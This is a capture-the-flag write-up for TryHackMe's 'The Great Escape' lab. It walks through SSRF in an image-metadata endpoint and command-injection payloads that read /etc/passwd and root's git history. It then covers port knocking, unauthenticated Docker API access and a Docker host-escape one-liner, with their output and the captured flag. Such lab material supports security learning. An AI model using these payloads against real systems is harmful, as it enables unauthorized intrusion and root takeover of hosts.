# 47 -The Great Escape (SSRF exploitation, CMD injection, GIT exploitation, Docker Exploitation)

Room Link --> [https://tryhackme.com/room/thegreatescape](https://tryhackme.com/room/thegreatescape)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv 10.10.30.114 -p- -sV


```
{% endcode %}

#### Gobudter enum

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.30.114 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 500 --no-error -x txt,php,db,sql,html

# returns
Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.30.114/5a365d86-d2b0-466b-a7e5-dc28dbbbcd56 => 200 (Length: 3834). To continue please exclude the status code or the length
```
{% endcode %}

So the error indicated that everything is returning code 200, and we should exclude code 200.

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.30.114 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 500 --no-error -x txt,php,db,sql,html -b 200,503

# now we get some results.
/api
```
{% endcode %}

CHecking robots.txt.

<figure><img src=".gitbook/assets/image (331).png" alt=""><figcaption></figcaption></figure>

So we have `/api, /exif-util, /*.bak.txt$` .

Navigating to /exif-util

<figure><img src=".gitbook/assets/image (333).png" alt=""><figcaption><p>we can upload files from here.</p></figcaption></figure>

However the `uploadFile` tab was a dead end, so we use `from Url` instead.

We setup a local python server and serve up an img file then supply the img link there.

<figure><img src=".gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

We got a hit.

<figure><img src=".gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

The site is making a GET request to `/api/exif` , with a param value: `?url=our_imageLink` .

However we don't knoww what is processing this. We can try to read local files and see.

<figure><img src=".gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

But we cannot :(

When i checked hint, it says wellknown files may help, so `robots.txt` , we try visiting all the links there.

The `/*.bak.txt` means `anything.bak.txt` so maybe we can try `/exif-util.bak.txt` .

Going to -> [http://10.10.30.114/exif-util.bak.txt](http://10.10.30.114/exif-util.bak.txt)

OO, we got something.

{% code overflow="wrap" lineNumbers="true" %}
```
<template>
  <section>
    <div class="container">
      <h1 class="title">Exif Utils</h1>
      <section>
        <form @submit.prevent="submitUrl" name="submitUrl">
          <b-field grouped label="Enter a URL to an image">
            <b-input
              placeholder="http://..."
              expanded
              v-model="url"
            ></b-input>
            <b-button native-type="submit" type="is-dark">
              Submit
            </b-button>
          </b-field>
        </form>
      </section>
      <section v-if="hasResponse">
        <pre>
          {{ response }}
        </pre>
      </section>
    </div>
  </section>
</template>

<script>
export default {
  name: 'Exif Util',
  auth: false,
  data() {
    return {
      hasResponse: false,
      response: '',
      url: '',
    }
  },
  methods: {
    async submitUrl() {
      this.hasResponse = false
      console.log('Submitted URL')
      try {
        const response = await this.$axios.$get('http://api-dev-backup:8080/exif', {
          params: {
            url: this.url,
          },
        })
        this.hasResponse = true
        this.response = response
      } catch (err) {
        console.log(err)
        this.$buefy.notification.open({
          duration: 4000,
          message: 'Something bad happened, please verify that the URL is valid',
          type: 'is-danger',
          position: 'is-top',
          hasIcon: true,
        })
      }
    },
  },
}
</script>

```
{% endcode %}

<figure><img src=".gitbook/assets/image (332).png" alt=""><figcaption></figcaption></figure>

So this is like an internal api stuff because port 8080 is not available externally when i scanned with nmap.&#x20;

So maybe we can pass it as a value to the `url` parameter.

Navigating to --> `http://10.10.30.114/api/exif?url=http://api-dev-backup:8080/` .

<figure><img src=".gitbook/assets/image (338).png" alt=""><figcaption></figcaption></figure>

What about trying to read files again?

I forgot to add the `/exif/` ie; `http://10.10.30.114/api/exif?url=http://api-dev-backup:8080/exif`

So:

`http://10.10.30.114/api/exif?url=http://api-dev-backup:8080/exif?url=file://etc/passwd`

<figure><img src=".gitbook/assets/image (339).png" alt=""><figcaption></figcaption></figure>

So some words are banned :(

But when we pass no value to the `url` parameter we get a different response:

`http://10.10.30.114/api/exif?url=http://api-dev-backup:8080/exif?url=`

<figure><img src=".gitbook/assets/image (340).png" alt=""><figcaption></figcaption></figure>

So its executing `curl` , we can escape from the cmd by adding a `;` ,

`http://10.10.30.114/api/exif?url=http://api-dev-backup:8080/exif?url=; cat /etc/passwd` .

<figure><img src=".gitbook/assets/image (342).png" alt=""><figcaption></figcaption></figure>

Still banned words. Lets try another cmd.

`http://10.10.30.114/api/exif?url=http://api-dev-backup:8080/exif?url=; id`&#x20;

And it worked :)

<figure><img src=".gitbook/assets/image (343).png" alt=""><figcaption></figcaption></figure>

We can use `ls -al ~` to list all files in the current directory.

<figure><img src=".gitbook/assets/image (344).png" alt=""><figcaption></figcaption></figure>

We can read that file with `cat ~/dev-note.txt` .

<figure><img src=".gitbook/assets/image (345).png" alt=""><figcaption></figcaption></figure>

We get a password and username, tried login with SSH but it was a deadend.

But in the root dir, we can see a `.git and .gitconfig` - dir.

We can use **-C** option for git to give the path for **.git directory** and type **log** to check the logs.

`http://10.10.30.114/api/exif?url=http://api-dev-backup:8080/exif?url=; git -C /root log`

```bash
# We get some commits
commit 5242825dfd6b96819f65d17a1c31a99fea4ffb6a
Author: Hydra <hydragyrum@example.com>
Date:   Thu Jan 7 16:48:58 2021 +0000

    fixed the dev note

commit 4530ff7f56b215fa9fe76c4d7cc1319960c4e539
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Removed the flag and original dev note b/c Security

commit a3d30a7d0510dc6565ff9316e3fb84434916dee8
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Added the flag and dev notes
```

The 3rd commit, where he added the file, lets view it.

`http://10.10.30.114/api/exif?url=http://api-dev-backup:8080/exif?url=; git -C /root diff a3d30a7d0510dc6565ff9316e3fb84434916dee8` .

Or we could also use `git -C /root show <ID>` .

<figure><img src=".gitbook/assets/image (346).png" alt=""><figcaption></figcaption></figure>

Got root flag.

{% code overflow="wrap" lineNumbers="true" %}
```bash
-Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.
```
{% endcode %}

So we will make some request to these ports using curl.

```bash
#!/bin/bash

curl 10.10.30.114:42
sleep 1
curl 10.10.30.114:1337
sleep 1
curl 10.10.30.114:10420
sleep 1
curl 10.10.30.114:6969
sleep 1
curl 10.10.30.114:63000
```

<figure><img src=".gitbook/assets/image (347).png" alt=""><figcaption></figcaption></figure>

Now docker port is open. `docker port 2375` .

<figure><img src=".gitbook/assets/image (348).png" alt=""><figcaption></figcaption></figure>

### Docker Exploitation

#### Enumeration

{% code lineNumbers="true" %}
```bash
# we can get some info about the docker instance.
curl http://10.10.95.235:2375/version | jq
```
{% endcode %}

<figure><img src=".gitbook/assets/image (349).png" alt=""><figcaption></figcaption></figure>

**Checking if we can access the docker API.**

{% code overflow="wrap" %}
```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ docker -H 10.10.95.235:2375 info    
Client:
 Context:    default
 Debug Mode: false

Server:
 Containers: 4
  Running: 4
  Paused: 0
  Stopped: 0
 Images: 27
 Server Version: 20.10.2
 Storage Driver: overlay2
  Backing Filesystem: extfs
  Supports d_type: true
  Native Overlay Diff: true
 Logging Driver: json-file
 Cgroup Driver: cgroupfs
 Cgroup Version: 1
 Plugins:
  Volume: local
  Network: bridge host ipvlan macvlan null overlay
  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog
 Swarm: inactive
 Runtimes: io.containerd.runc.v2 io.containerd.runtime.v1.linux runc
 Default Runtime: runc
 Init Binary: docker-init
 containerd version: 269548fa27e0089a8b8278fc4fc781d7f65a939b
 runc version: ff819c7e9184c13b7c2607fe6c30ae19403a7aff
 init version: de40ad0
 Security Options:
  apparmor
  seccomp
   Profile: default
 Kernel Version: 4.15.0-130-generic
 Operating System: Ubuntu 18.04.5 LTS
 OSType: linux
 Architecture: x86_64
 CPUs: 1
 Total Memory: 983.2MiB
 Name: great-escape.thm
 ID: FDCS:BLAR:AJNY:PW6Y:DVAY:R5IQ:VNLF:WRQ5:FP6Y:2IB5:U37T:3W6L
 Docker Root Dir: /var/lib/docker
 Debug Mode: false
 Registry: https://index.docker.io/v1/
 Labels:
 Experimental: false
 Insecure Registries:
  127.0.0.0/8
 Live Restore Enabled: false

WARNING: API is accessible on http://0.0.0.0:2375 without encryption.
         Access to the remote API is equivalent to root access on the host. Refer
         to the 'Docker daemon attack surface' section in the documentation for
         more information: https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface
WARNING: No swap limit support
```
{% endcode %}

#### Before attacking it, we will do some checks:

1. Are there some containers running: `docker -H 10.10.95.235:2375 ps` .
2. Stopped containers? `docker -H 10.10.95.235:2375 ps -a` .
3. How many images? `docker -H 10.10.95.235:2375 images` .

Inspect those images, there could be images with juicy infos, maybe you could run those images and access them.

#### Accessing the Containers

Spawning a shell inside a container is done via the `exec` cmd.

In our case here is a list of all the images here.

<figure><img src=".gitbook/assets/image (350).png" alt=""><figcaption></figcaption></figure>

Lets spawn bash shell on the `dockerescapecompose_frontend_1` - container.

{% code overflow="wrap" lineNumbers="true" %}
```bash
docker -H 10.10.95.235:2375 exec -it dockerescapecompose_frontend_1 /bin/bash

# or using the image id
docker -H 10.10.95.235:2375 exec -it 49fe455a9681 /bin/bash
```
{% endcode %}

And we got a root shell.

<figure><img src=".gitbook/assets/image (351).png" alt=""><figcaption></figcaption></figure>

#### Check if any of the docker instance is running in Privileged Mode

{% code overflow="wrap" %}
```bash
# format.
docker -H <ip_address> inspect --format='{{.HostConfig.Privileged}}' <container id>

# using bash
if [[ $(docker inspect --format='{{.HostConfig.Privileged}}' <container id>) == "false" ]]; then
    echo not privileged
else
    echo privileged
fi
```
{% endcode %}

{% code overflow="wrap" %}
```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ docker -H 10.10.95.235:2375 inspect --format='{{.HostConfig.Privileged}}' 49fe455a9681
false
```
{% endcode %}

#### Flag 1 was found in the dir:

`/usr/share/nginx/html/.well-known` - in the `dockerescapecompose_frontend_1` container.

<figure><img src=".gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>

#### Breaking out of the Docker Instance

When we run `docker -H 10.10.95.235:2375 images` we can see there is alphine 3.9 image available which we can exploit and escape out of docker instance.

We can check `gtfobin` for a quick oneliner for this.

{% code overflow="wrap" %}
```bash
# we have to add the alphine version tag to the cmd too, ie; alphine:3.9
docker -H 10.10.95.235:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt sh
```
{% endcode %}

And we escaped successfully.

{% code overflow="wrap" lineNumbers="true" %}
```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ docker -H 10.10.95.235:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt sh
# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
hydra:x:1000:1000:Hydra,,,:/home/hydra:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
# 
# 

```
{% endcode %}

We can see the `hydra` user now shows up.

```
# ls /root -al
total 24
drwx------  3 root root 4096 Jan  6  2021 .
drwxr-xr-x 22 root root 4096 Jan  9  2021 ..
lrwxrwxrwx  1 root root    9 Jan  6  2021 .bash_history -> /dev/null
-rw-r-----  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 Jan  6  2021 .local
-rw-r-----  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   74 Jan  6  2021 flag.txt
# cd /root
# cat flag.txt
Congrats, you found the real flag!

THM{c62517c0cad93ac93a92b1315a32d734}
# 
```

Done!

